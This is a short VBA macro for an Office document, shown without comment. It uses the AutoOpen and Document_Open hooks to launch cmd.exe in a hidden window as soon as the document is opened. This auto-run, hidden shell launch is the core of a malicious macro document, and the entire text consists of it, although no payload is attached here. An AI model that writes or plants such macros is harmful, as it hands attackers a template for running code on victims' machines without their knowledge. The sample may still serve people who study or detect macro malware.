Sub createObjectShell()
	Dim str As String
	str = "cmd.exe"
	Shell str, vbHide
End Sub

Sub Document_Open()
	createObjectShell
End Sub

Sub AutoOpen()
	createObjectShell
End Sub
